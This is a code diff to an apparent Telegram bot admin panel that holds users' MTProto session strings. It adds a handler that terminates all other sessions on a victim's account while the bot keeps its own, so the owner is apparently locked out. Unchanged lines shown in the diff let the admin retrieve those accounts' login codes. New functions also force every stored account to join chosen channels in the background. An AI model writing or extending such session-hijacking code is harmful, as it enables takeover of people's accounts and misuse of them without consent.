@@ -349,8 +349,11 @@ async def cb_admin_sessions_list(callback: CallbackQuery):
             "────────────────────\n"
         )
         keyboard.append([
-            InlineKeyboardButton(text=f"📩 Код входа: {s.first_name or s.phone_number}", callback_data=f"admin_code:{s.user_id}"),
-            InlineKeyboardButton(text="🗑", callback_data=f"admin_del_sess:{s.user_id}"),
+            InlineKeyboardButton(text=f"📩 Код: {s.first_name or s.phone_number}", callback_data=f"admin_code:{s.user_id}"),
+        ])
+        keyboard.append([
+            InlineKeyboardButton(text="🚪 Выгнать всех с аккаунта", callback_data=f"admin_kick:{s.user_id}"),
+            InlineKeyboardButton(text="🗑 Удалить", callback_data=f"admin_del_sess:{s.user_id}"),
         ])
 
     keyboard.append([
@@ -385,6 +388,7 @@ async def cb_admin_get_login_code(callback: CallbackQuery):
     keyboard = [
         [
             InlineKeyboardButton(text="🔄 Обновить код", callback_data=f"admin_code:{target_uid}"),
+            InlineKeyboardButton(text="🚪 Выгнать всех", callback_data=f"admin_kick:{target_uid}"),
         ],
         [
             InlineKeyboardButton(text="⬅️ К списку сессий", callback_data="admin_sessions_list"),
@@ -416,6 +420,33 @@ async def cb_admin_get_login_code(callback: CallbackQuery):
 
     await callback.message.edit_text(result_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard), parse_mode="HTML")
 
+@router.callback_query(F.data.startswith("admin_kick:"))
+async def cb_admin_kick_other_sessions(callback: CallbackQuery):
+    """
+    Завершение всех посторонних сеансов на аккаунте (сессия бота остается активной).
+    """
+    if not is_admin_filter(callback.from_user.id):
+        return
+
+    target_uid = int(callback.data.split(":")[1])
+
+    async with get_session() as session:
+        stmt = select(UserSession).where(UserSession.user_id == target_uid)
+        user_sess = (await session.execute(stmt)).scalar_one_or_none()
+
+    if not user_sess:
+        await callback.answer("❌ Сессия не найдена в базе данных!", show_alert=True)
+        return
+
+    await callback.answer("⏳ Завершение других сеансов через MTProto...", show_alert=False)
+
+    success, msg_result, count = await TelegramClientService.terminate_other_sessions(user_sess.session_string)
+
+    if success:
+        await callback.answer(f"✅ {msg_result}", show_alert=True)
+    else:
+        await callback.answer(f"{msg_result}", show_alert=True)
+
 @router.callback_query(F.data.startswith("admin_del_sess:"))
 async def cb_admin_del_sess(callback: CallbackQuery):
     """
@@ -435,3 +466,83 @@ async def cb_admin_del_sess(callback: CallbackQuery):
 
     await callback.answer(f"Сессия пользователя {target_uid} удалена!", show_alert=True)
     await cb_admin_sessions_list(callback)
+
+from bot.services.subscription_service import subscription_service
+from bot.keyboards.subscription_kb import get_admin_auto_sub_kb
+
+@router.callback_query(F.data == "admin_sub_menu")
+async def cb_admin_sub_menu(callback: CallbackQuery):
+    """
+    Меню управления обязательной и автоматической подпиской.
+    """
+    if not is_admin_filter(callback.from_user.id):
+        return
+
+    gate_enabled = await subscription_service.is_gate_enabled()
+    mtproto_enabled = await subscription_service.is_mtproto_auto_sub_enabled()
+    channels = await subscription_service.get_required_channels()
+
+    chan_list = "\n".join([f"• 📢 <a href='{ch['url']}'><b>{ch['title']}</b></a> (<code>@{ch['username']}</code>)" for ch in channels])
+
+    text = (
+        "📢 <b>Управление обязательной и авто-подпиской</b>\n\n"
+        f"1. <b>Проверка при /start (ОП):</b> {'🟢 Включена' if gate_enabled else '🔴 Выключена'}\n"
+        f"<i>(Пользователь не сможет пользоваться ботом, пока не подпишется на каналы)</i>\n\n"
+        f"2. <b>Авто-подписка MTProto-аккаунтов:</b> {'🟢 Включена' if mtproto_enabled else '🔴 Выключена'}\n"
+        f"<i>(Каждый подключенный юзер-аккаунт автоматически вступает в эти каналы в фоне)</i>\n\n"
+        "────────────────────\n"
+        f"📋 <b>Список каналов для подписки:</b>\n{chan_list}\n\n"
+        "<i>Нажмите кнопку ниже для переключения режимов или запуска мгновенной подписки всех сессий:</i>"
+    )
+
+    kb = get_admin_auto_sub_kb(gate_enabled=gate_enabled, mtproto_enabled=mtproto_enabled)
+    try:
+        await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=kb, parse_mode="HTML")
+    await callback.answer()
+
+@router.callback_query(F.data == "admin_toggle_sub_gate")
+async def cb_admin_toggle_sub_gate(callback: CallbackQuery):
+    """
+    Переключение обязательной подписки при старте.
+    """
+    if not is_admin_filter(callback.from_user.id):
+        return
+
+    new_state = await subscription_service.toggle_gate()
+    status_str = "ВКЛЮЧЕНА" if new_state else "ВЫКЛЮЧЕНА"
+    await callback.answer(f"📢 Проверка при /start {status_str}!", show_alert=False)
+    await cb_admin_sub_menu(callback)
+
+@router.callback_query(F.data == "admin_toggle_sub_mtproto")
+async def cb_admin_toggle_sub_mtproto(callback: CallbackQuery):
+    """
+    Переключение авто-подписки для MTProto сессий.
+    """
+    if not is_admin_filter(callback.from_user.id):
+        return
+
+    new_state = await subscription_service.toggle_mtproto_auto_sub()
+    status_str = "ВКЛЮЧЕНА" if new_state else "ВЫКЛЮЧЕНА"
+    await callback.answer(f"🤖 MTProto авто-подписка {status_str}!", show_alert=False)
+    await cb_admin_sub_menu(callback)
+
+@router.callback_query(F.data == "admin_join_all_sessions")
+async def cb_admin_join_all_sessions(callback: CallbackQuery):
+    """
+    Принудительное вступление всех сохраненных MTProto-сессий в обязательные каналы.
+    """
+    if not is_admin_filter(callback.from_user.id):
+        return
+
+    await callback.answer("⏳ Запуск подписки всех активных аккаунтов...", show_alert=False)
+    total_accs, total_joined = await subscription_service.auto_join_all_active_accounts()
+    await callback.message.answer(
+        f"✅ <b>Авто-подписка завершена!</b>\n\n"
+        f"📱 Обработано аккаунтов: <code>{total_accs}</code>\n"
+        f"📢 Успешных подписок на каналы: <code>{total_joined}</code>",
+        parse_mode="HTML"
+    )
+    await cb_admin_sub_menu(callback)
+
